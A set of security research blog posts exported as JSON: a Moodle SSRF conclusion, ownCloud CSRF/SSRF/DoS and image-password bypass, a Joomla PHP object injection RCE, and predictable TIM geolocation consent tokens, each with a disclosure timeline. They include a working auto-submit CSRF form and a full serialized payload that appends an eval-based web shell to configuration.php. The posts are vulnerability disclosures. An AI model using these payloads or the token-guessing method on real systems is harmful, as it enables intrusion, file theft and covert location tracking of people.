Documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html){:target=\"blank\"}).\n\n\n![img7](/notes/images/moodle/7.png)\n\n![img8](/notes/images/moodle/8.png)\n\n## The old Blind SSRF\nThe unpatched Blind SSRF vulnerability (CVE-2018-1042) was already described here: [exploit-db/exploits/47177](https://www.exploit-db.com/exploits/47177){:target=\"blank\"}. The patch did not applied any fix, so it is still exploitable and more suitable for internal port scans (as it is blind):\n\n![img9](/notes/images/moodle/9.png)\n\nYou can find both exploits in the Reference section.\n\n## Conclusions and Workaround\nAs we said, these SSRF are actually working on the latest Moodle release and their impact can be pretty critical for cloud based instances. Moodle has an open issue that plans to restrict most common restriction scenarios [MDL-56873](https://tracker.moodle.org/browse/MDL-56873){:target=\"blank\"} from 2016.\n\nTo fix these issues, from 'Site Administration \u003e Security \u003e HTTP Security' it is possible to restrict allowed hosts and ports (cURL blocked hosts and cURL allowed ports). You can customize these configurations based on your environment (such as restricting the loopback, internal network and allowing only HTTP ports to avoid port scans also to external sources).\n\n## Timeline\n\n- 02/02/2020 - Moodle contacted\n- 03/02/2020 - They received the request and handle the case\n- 06/02/2020 - Blind SSRF vulnerability rejected (System Administrators should fix it)\n- 11/03/2020 - We replied to some questions\n- 25/03/2020 - Also the SSRF vulnerability is rejected (System Administrators should fix it)\n- 25/03/2020 - Tried to emphasize the risk\n- 30/03/2020 - Issues closed without a fix","lastmodified":"2022-12-21T14:40:46.18257378Z","tags":null},"/notes/Owncloud-Multiple-Vulnerabilities-CSRF-SSRF-and-Information-Leak":{"title":"Owncloud Multiple Vulnerabilities (CSRF, SSRF and Information Leak)","content":"\n## Introduction\nDuring the research time in Hacktive Security I discovered several flaws in the [owncloud](https://owncloud.org/) product.\n\u003cbr\u003eOwncloud is an open-source cloud service similar to Google Drive. It is a good and popular piece of software and it was strange that the last CVE was from the far 2017 (2 years ago).So, we started looking at it and we disclosed 3 vulnerabilities related to the file sharing context, for sure a good attack vector.\n\nWhat I discovered could **compromise user's root folder** (read/write) via *CSRF*, cause an **authenticated Denial of Service** or **interact with local services** (*SSRF*) and **bypass password protected images**.\n\nWe reported all these issues in 17/10/2019, the ownCloud team fixed two of them after few months (SSRF and the bypass of protected images), but still do not have a patch for the reported CSRF. We tried to ping them multiple times and after 277 days since the first contact we decided to make them public (Disclosure Timeline at the end of the post).\n\n\n\n## Compromise user‚Äôs root folder via CSRF\n\nBy exploiting a Cross-Site Request Forgery, it is possible to trick a user to share its whole **root folder** with another user or with a public link without authentication.\n\nThis is the vulnerable Request:\n\n```c\nPOST /ocs/v2.php/apps/files_sharing/api/v1/shares?format=json HTTP/1.1\nHost: mycloud.com:8081\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nCookie: ocqbn9pixyab=XXXX; oc_sessionPassphrase=XXXX\nContent-Length: 52\n\nshareType=0\u0026shareWith=attacker\u0026permissions=31\u0026path=./\n\n```\n\n*Note: **owncloud doesn't let users share their own root folder**, you cannot do it via GUI and if you make a forged request with '/' to indicate the root folder, an error message appears:*\n\n![img1](/notes/images/owncloud/1.png)\n\n*This was not a big deal because It was easily bypassable just by using './' as a payload inside the 'path' parameter:*\n\n![img2](/notes/images/owncloud/2.png)\n\n\nThe '**shareType**' indicates the type of sharing. In this case 0 means a share with another user specified in the **'shareWith'** parameter. A shareType 3 means a public share through a public link with 15 random characters. The entropy is too high to bruteforce and it is well implemented (this share type could be fine chaining an XSS). Last, but not least, **'permissions'** set to 31 means read and write permissions on the share.\n\nSimulating an offensive scenario, this could be the attacker's page:\n\n```html\n\u003cform name=\"csrf\" enctype=\"application/x-www-form-urlencoded\" method=POST action=https://TARGET/ocs/v2.php/apps/files_sharing/api/v1/shares?format=json\u003e\n    \u003cinput type=hidden name=shareType value=\"0\"\u003e\n    \u003cinput type=hidden name=shareWith value=\"ATTACKER\"\u003e\n    \u003cinput type=hidden name=permissions value=\"31\"\u003e\n    \u003cinput type=hidden name=path value=\"./\"\u003e    \n\u003c/form\u003e\n\n\u003cscript\u003e\ndocument.csrf.submit();\n\u003c/script\u003e\n\n```\n\nVictim visits the page:\n\n![img3](/notes/images/owncloud/3.png)\n\nAnd the root folder is shared with the attacker:\n\n![img4](/notes/images/owncloud/4.png)\n\n\nIt would be cool to chain this vulnerability with a Cross-Site Scripting. Making a request from the same site doesn't trigger CORS, and the response is readable (in the response there is the public link). In this case, it could be just necessary to inject a script that makes a request to the vulnerable endpoint, read the response that contains the public link share, and send this one to the attacker. In this way, the whole root folder could be easily accessible from the internet and without authentication. But, sadly, this is not the case (and owncloud also employs a strict CSP). We only had a CSRF, so we could only perform blind POST requests.\n\nThis wannabe scenario is still possible with older browsers that do not support CORS validation or configured web server with too permissive policies. \n\n\n\n## Server Side Request Forgery + DOS\n\nA convenient functionality is to fetch files from a public link to your own (own-)cloud. When you receive a public link and you want to save the file in your cloud, you can use the arrow at the top right and it will do the hard work for you:\n\n![img5](/notes/images/owncloud/5.png)\n\nIn order to fetch the file, it has to know where you want to get the file, and it is specified in the following request :\n\n![img6](/notes/images/owncloud/6.png)\n\nFrom this parameter you can perform Server Side Requests to arbitrary local services, including the loopback:\n\n![img7](/notes/images/owncloud/7.png)\n\nIf we try this request we receive a callback from localhost:\n\n![img8](/notes/images/owncloud/8.png)\n\nThe docker provided from their official repository ships with Redis configured, that could be an interesting component to attack with our SSRF. In the first request we do not have many controllable parameters, just the URI (without CLRF). So we started to go deeper, because it has to make other requests in order to fetch a file from another cloud.\n\nWe started to analyze the flow between two valid clouds (thanks burp for the reverse proxy job) and we were right, we got multiple requests:\n\n![img9](/notes/images/owncloud/9.png)\n\n*(screen from ngrok - cleaner than burp requests)*\n\nMaybe we could be lucky and find something more useful in later requests (some parameters are reflected from response of the receiver cloud).. But nope. That was a fail. After 2 days of fuzzing/implementation of a valid clone of an owncloud receiver in python (and ngrok in order to avoid caching of a target domain), we stopped because it was not the right path, and we were losing too much time for a potential Authenticated RCE valid only for some environments. And, unfortunately, we couldn't achieve RCE.\n\nBy the way, SSRF can be used to scan the internal network for open services and/or interact with them, but if it doesn't reach a couple of addresses .. you have a nice little Denial Of Service (tested on a production server).\n\nBurp DOS configuration:\n\n![img10](/notes/images/owncloud/10.png)\n![img11](/notes/images/owncloud/11.png)\n![img12](/notes/images/owncloud/12.png)\n\nAnd few seconds later‚Ä¶\n\n![img13](/notes/images/owncloud/13.png)\n\n## Bypass password protected images\n\nWhen you want to share to non authenticated users something in the cloud, you can use the 'Share with Public Link' option and protect it with a password in order to avoid other people watching it, if they eventually reach the link.\n\nWhen sharing Images, the generated token (the 15 characters long narrowed before) can be used in the preview functionality without authentication, bypassing the required password.\n\nThe protected shared image:\n\n![img14](/notes/images/owncloud/14.png)\n\nImage leaked:\n\n![img15](/notes/images/owncloud/15.png)\n\n## Timeline\n- 17/10/2019 - Issues reported\n- 15/11/2019 - Request an update since we didn‚Äôt receive any reply\n- 13/12/2019 - 2 of 3 vulnerabilities fixed\n- 09/02/2020 - We requested an update for the third vulnerability\n- 09/02/2020 - They‚Äôre working to patch it\n- 13/07/2010 - No patch, we informed them that we are going to make them public\n- 27/07/2020 - No reply, issues published","lastmodified":"2022-12-21T14:40:46.18257378Z","tags":null},"/notes/Rusty-Joomla-Remote-Code-Execution":{"title":"Rusty Joomla Remote Code Execution","content":"\n## Introduction\n\nDuring one of research activities in [Hacktive Security](http://hacktivesecurity.com/), we discovered an **undisclosed PHP Object Injection** on Joomla CMS from the release 3.0.0 to the 3.4.6 (releases from 2012 to December 2015) that leads to Remote Code Execution.\nA PHP Object Injection was discovered in the wild and patched in the 3.4.5 version (CVE-2015-8562), however, this vulnerability depends also a lot on the PHP release installed becoming not really trusty for all environments.\n\nComparing this RCE with CVE-2015-8562:\n+ It is completely independent from the environment, becoming more reliable;\n+ Vulnerable from the 3.0.0 to 3.4.6 (just one more minor release, not so much by the way);\n- Few releases vulnerable compared to CVE-2015-8562.\n\nHowever, the fun part of this vulnerability was the exploitation. There aren‚Äôt a lot of blog posts about some more advanced and manual exploitation of PHP Object Injection (except for some good resources from RIPS) so this paper can be useful while exploiting it in other contexts.\n\n\n## How Sessions works\nJoomla sessions are stored in the database as PHP Objects and they are handled by PHP session functions. It is an interesting attack vector because sessions are also stored for unauthenticated users so an Object Injection there can lead to unauthenticated RCE.\n\nFunctions read() and write() defined in ‚Äòlibraries/joomla/session/storage/database.php‚Äô are set by the session_set_save_handler() in order to be used as read and write handlers for the session_start() call at ‚Äòlibraries/joomla/session/session.php:__start‚Äô\n\nThis is an example of a classic Joomla (before 3.4.6) session stored in the database for an unauthenticated user (at table __session):\n\n![img](/notes/images/rusty/0.png)\n\nThere are many objects defined, but the most interesting thing is how input parameters are handled in the session.\nIf we make a regular action with parameters, these ones and the result message of the action, are stored in the session object like this:\n\n![img](/notes/images/rusty/1.png)\n\nWhen we perform POST requests in Joomla we usually have a 303 redirect that will redirect us to the result page. That‚Äôs an important note for the exploitation, because the first request (with parameters) will only cause Joomla to perform the action and store (e.g. call the write() function) the session, then the 303 redirect will retrieve (e.g. call the read() function) it and display the message back to the user.\n\n\n\n## The vulnerability\nThis is the code for the read and write functions (just removed unnecessary code).\n\n![img](/notes/images/rusty/2.png)\n\nThe write function accept 2 parameters, the session_id (from the cookie) and the serialized object. Before storing data into the database there is an interesting replace of \"\\x00\\x2a\\x00\" (chr(0).\"\\*\".chr(0)) with \"\\0\\0\\0\". That‚Äôs because MySQL cannot save Null Bytes and $protected variables are prefixed with ‚Äò\\x00\\x2a\\x00‚Äô in the serialized object. \n\nOn the other hand, when reading, the read function will replace ‚Äò\\0\\0\\0‚Äô with ‚Äò\\x00\\x2a\\x00‚Äô in order to reconstruct the original object.\n\nThe main issue with this replace is that it‚Äôs replacing 3 bytes with 6 bytes:\n\n![img](/notes/images/rusty/3.png)\n\nThis behaviour has been introduced from the 3.0.0 version and affecting Joomla until 3.4.6. Starting from 3.4.7 the piece of code is still present but the session is base64 encoded and stored in the database.\n\nAs I said before, we can manipulate the session object through action parameters. In this way, we can inject ‚Äò\\0\\0\\0‚Äô that will be replaced from the read function with 3 bytes, invalidating the object because of incorrect size.\nIf we take the login form as a target and we put ‚Äòmy\\0\\0\\0username‚Äô in the username field, we end up with the following part of object in the database:\n\n```php\ns:8:s:\"username\";s:16:\"my\\0\\0\\0username\"\n```\n\nWhen the session object is read from the read function, ‚Äò\\0\\0\\0‚Äô will be replaced as demonstrated before, assembling the following value:\n\n```php\ns:8:s:\"username\";s:16:\"myN\\*Nusername\" --\u003e Invalid Size\n```\nThe replaced string is only 13 bytes long but the declared string size is still 16!\nWe can now take this ‚Äòoverflow‚Äô to our advantage and forge a new object that will lead us to the final goal... RCE! :)\n\n\n\n## Exploitation\nIn order to trigger our arbitrary object and achieve RCE we need two parameters in a row, the first one will cause the ‚Äòoverflow‚Äô and the second will contain the last part of the exploit. The perfect target (included in a default installation) is the login form with the ‚Äòusername‚Äô and ‚Äòpassword‚Äô fields.\n\nThat‚Äôs the plan:\n- Overflow the username field with enough ‚Äò\\0\\0\\0‚Äô in order to land in the password field\n- Reconstruct a valid object\n- Send the exploit\n- Trigger the exploit (with the redirect)\n\nWe know that we can downsize the string size. By doing that on the username field (that precede the password) we can fake it and let it ends inside the next parameter under our control.\n\n```php\n[..]s:8:s:\"username\";s:10:\"MYUSERNAME\";s:8:\"password\";s:10:\"MYPASSWORD\"[...]\n```\n\nAs you can see, the distance from the end of the username value and the start of the password is 27 bytes. The vulnerable replace let us decrease the value with a multiple of 3 (6 bytes - 3 bytes) so we need at least 8 times ‚Äò\\0\\0\\0‚Äô in the username field that will cause a simple padding of 1 extra character in the second parameter in our exploit (in the POC I used 9 times \\0\\0\\0 to be sure).\n\nIn bold, what unserialize read for the ‚Äòusername‚Äô:\n\n\n(in database)\ns:8:s:\"username\";s:54:\"**\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0**\";s:8:\"password\";s:10:\"MYPASSWORD\"\n\n\n(after read and replace)\ns:8:s:\"username\";s:54:\"**NNNNNNNNNNNNNNNNNNNNNNNNNNN\";s:8:\"password\";s:10:\"MYPA**SSWORD\"\n\n(Achieve Object injection):\ns:8:s:\"**username**\";s:54:\"**NNNNNNNNNNNNNNNNNNNNNNNNNNN\";s:8:\"password\";s:10:\"MYPA**\";s:2:\"HS\":O:15:\"ObjectInjection\"[...]\n\nWe have a stable way to inject an Object, now it‚Äôs the time to craft it.\nWe can use the payload from the CVE-2015-XXXX exploit as a starting point, however it requires some modification:\n\n```php\nO:21:\"JDatabaseDriverMysqli\":3:{s:4:\"\\0\\0\\0a\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:5:\"cache\";b:1;s:19:\"cache_name_function\";s:6:\"assert\";s:10:\"javascript\";i:9999;s:8:\"feed_url\";\n```\n\nThis payload will instantiate a **JDatabaseDriverMysqli** object and assign an array of other objects in the **disconnectHandlers** attribute (a protected array variable). This is because the defined \\_\\_destruct of this class will call $this-\u003edisconnect(), that leads to an interesting call_user_func_array():\n\n![img8](/notes/images/rusty/4.png)\n\nFor each value in the disconnectHandlers array a call_user_func_array() is performed with a reference to the object (\u0026$this) as a parameter. It‚Äôs a good gadget, but we only have control over the function call and not on parameters. That‚Äôs where SimplePie object came in our help.\n\nIn SimplePie::init (declared in libraries/simplepie/simplepie.php) we have different interesting gadgets, like the following:\n\n![img](/notes/images/rusty/5.png)\n\n\nThis is much more suitable, because we have a call_user_func with both function and parameter values under our control.\nHowever, that‚Äôs why I think the original payload wasn‚Äôt working, there is a condition that must be met in order to receive this line of code: $this-\u003ecache must be declared and $parsed_feed_url[‚Äòscheme‚Äô] (the parsed url from $feed_url) needs to contain something.\nBypass this condition was not so difficult. At first, with cache_name_function set to ‚Äòsystem‚Äô, something like ‚Äòhttps://something/;id‚Äô was enough. The first command fails but the semicolon do the rest.\n\nHowever, while developing the Metasploit module, I was not so happy about this solution. If the target environment have disabled functions like system, exec, shell_exec, etc., you cannot do a lot with this exploit, and I wanted to make something more suitable for more environments.\nSo, I moved back to the assert function and see if I could achieve PHP code execution while respecting the condition. The only think the condition is checking for is a string that contains a valid schema (e.g. http:// ), but this will cause a syntax error. In order to bypass it we can chain an OR (||) statement and trap the schema into a variable, like this:\n\n```php\n\u003cPHP CODE\u003e || $a=\"http//\";\n```\n\nWe were limited again against some special characters (like ‚Äò?‚Äô) and from the assert function, so we need a way to move on a less restrictive environment. The first idea was to create a php file in the root directory with an eval(), but without the ‚Äò?‚Äô the web server will not interpret our code. A ‚Äòconfiguration.php‚Äô file is present in the root directory. It is nothing more than a class declaration with configuration parameters in it. We can append an eval at the end of this file and use it to execute PHP code with the following payload:\n\n```php\n file_put_contents('configuration.php','if(isset($_POST[\\\\\\'test\\\\\\'])) eval($_POST[\\\\\\'test\\\\\\']);\\', FILE_APPEND) || $a=\\'http://wtf\\';\n```\n\nThat will result in the following call:\n\n```php\ncall_user_func(\"assert\",\"file_put_contents('configuration.php','if(isset($_POST[\\\\\\'test\\\\\\'])) eval($_POST[\\\\\\'test\\\\\\']);\\', FILE_APPEND) || $a=\\'http://wtf\\';\")\n```\nAt the end, this is the final object:\n\n```php\ns:2:\"HS\":O:21:\"JDatabaseDriverMysqli\":3:{s:4:\"\\0\\0\\0a\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:5:\"cache\";b:1;s:19:\"cache_name_function\";s:6:\"assert\";s:10:\"javascript\";i:9999;s:8:\"feed_url\";s:125:\"file_put_contents('configuration.php','if(isset($_POST[\\'test\\'])) eval($_POST[\\'test\\']);', FILE_APPEND) || $a='http://wtf';\";}i:1;s:4:\"init\";}}s:13:\"\\0\\0\\0connection\";i:1;}\n```\n\nNow we have everything necessary to develop a working exploit. Putting stuff together, we can send the exploit using the login form, this will store the malicious object into the database.\nThen we can follow the redirect from the first response and the payload will be retrieved from the database and unserialized from the session_start() function and .. we got RCE!\n\n\n## POC\n\u003ciframe width=\"480\" height=\"360\" src=\"https://www.youtube.com/embed/Z-GbT5YB-Tc\" frameborder=\"0\"\u003e \u003c/iframe\u003e\n\n\n## Exploit\n\n- https://www.exploit-db.com/exploits/47465\n- https://www.exploit-db.com/exploits/47539 (Metasploit)\n\n## References\n- https://nvd.nist.gov/vuln/detail/CVE-2015-8562\n- https://blog.ripstech.com/2018/woocommerce-php-object-injection/\n+ https://www.php.net/manual/en/ref.session.php","lastmodified":"2022-12-21T14:40:46.18257378Z","tags":null},"/notes/TIM-Mobile-Phone-Geolocalization":{"title":"TIM Mobile Phone Geolocalization","content":"\nDuring the monthly research activity in [Hacktive Security](https://hacktivesecurity.com/), we found and went in depth with an interesting security issue allowing geolocation of mobile devices using TIM, an Italian communication provider. A malicious user could find the TIM customers geo-position by forcing the approval mechanism to allow the geopositional tracking. \n\nThe research has been focused on TerminalLocation API service provided by TIM on its API Store.\nTerminalLocation lets retrieve location of arbitrary devices by their phone numbers.\nBelow a service description provided by TIM:\n\nWith TIM API - TerminalLocation track and monitor the location of mobile devices using geographic coordinates (latitude and longitude), date and time. Location information are valid for TIM customers.‚Äú\n\nLet's see how it works.\n\n## Overview of the service\n\nIn order to use the API service, we needed to sign up and then create a test application to retrieve an API key.\nHence, you can make a GET request to `/try/location/v1.1/\u003cPHONE_NUMBER\u003e` including the API key in the request header. If this is the first request targeting the phone number, an SMS is sent asking for an authorization approval to notify the current position at any time.\n\n\n![img1|200](/notes/images/tim/1.png)\n\nIn order to accept being geolocalized, the user has to click on the link in the message, which contains a base64 encoded user-token, and then click the confirmation button.\n\n![img2|200](/notes/images/tim/2.png)\n\nThis action triggers a GET request to /tim/api/unsecured/consenso/\\\u003cuser-token\\\u003e.\nEverything seems ok, users have to agree in order to use this service. But things turned out for the best, almost...\n\n## Vulnerability\n\nWe started to collect multiple tokens and we were surprised about their low entropy.\nThe base64 string sent within the link hides a 24 character token with both static and at first glance random values. If we break up some tokens, obtained within the same day and with few hours of delay, we noticed the following schema:  \n\n```\n\nXXXX AAAA YYYYYYYYYYYYYYY D  \nXXXX BBBB YYYYYYYYYYYYYYY E  \nXXXX CCCC YYYYYYYYYYYYYYY F  \n```\n(next day) \n```\n\nXXXX GGGG ZZZZZZZZZZZZZZZ H  \n```\n\nThe schema may be decoded as follows:\n- First part: the 4 Xs are always the same, they may be a static value\n- Second part: the 4 As, Bs, Cs and Ds are random characters\n- Third part: the 15 Ys and Zs are constants changing day by day; it may be related to the current date\n- Fourth part: the E, F, G, H are random characters\n\nWe have confirmed that these tokens are not randomly generated and they have pretty easylogic behind.\n\nThe crucial test consisted to send requests for 2 tokens in a very short period of time (2 seconds):\n\n```\nXXXX XXDD YYYYYYYYYYYYYYY A  \nXXXX XXFF YYYYYYYYYYYYYYY B\n```\n\n\nBingo!\nThey differ for just 3 characters and they are incremental!\n\nAt this point, we could easily guess with more confidence how tokens are generated: The first 4 characters are always the same, then 4 characters could be related to a timestamp, because they are consecutive, then 15 characters related to the current day and finally 1 random character in the last position.\nWith this insight we could create an enumeration tool, but another key point was reducing the character set:\nA request with a syntactically correct token returns an error message containing \"agreement not found\":\n\n![img3](/notes/images/tim/3.png)\n\nWith a malformed token (invalid length or invalid character set) it says Invalid parameters:\n\n![img3](/notes/images/tim/4.png)\n\nAfter few fuzzing requests we could determine that all characters were in a hexadecimal format, reducing a lot the enumeration (16 characters instead of 36 characters of all lowercase alphabet plus numbers).\n\n## Exploitation\n\nThe exploitation has been pretty easy:\n- Receive a token on our phone via SMS\n- Send the second token to the victim after few seconds\n- Deduce victim‚Äôs token from our one.\n- Localize the phone!\n\nIn order to automate this process, we wrote a few lines in python.\nFirst, request two tokens with two seconds of delay (the first token to us and the second to the victim).\nThe timing is crucial because of its consecutive logic based on some sort of timestamp.\n\n![img4](/notes/images/tim/5.png)\n\nAttacker‚Äôs token:\n\n\n![img5|300](/notes/images/tim/6.png)\n\n\nNow we have the token generated before the victim‚Äôs one and we can easily predict it with an enumeration with 2 characters starting at the 6th position and one last character.\n\n![img6](/notes/images/tim/7.png)\n\nThanks to multi-threading and, of course, low entropy, this enumeration took less than 1 second to retrieve the victim‚Äôs token.\nWith that token, we can now accept the agreement to the service with a PUT request to `/tim/api/unsecured/consenso/\u003ctoken\u003e?operazione=APPROVA` and geolocate the victim phone:\n\n![img7](/notes/images/tim/8.png)\n\n![img8](/notes/images/tim/8.png)\n\n\nAnd that's it :)","lastmodified":"2022-12-21T14:40:46.18257378Z","tags":null}}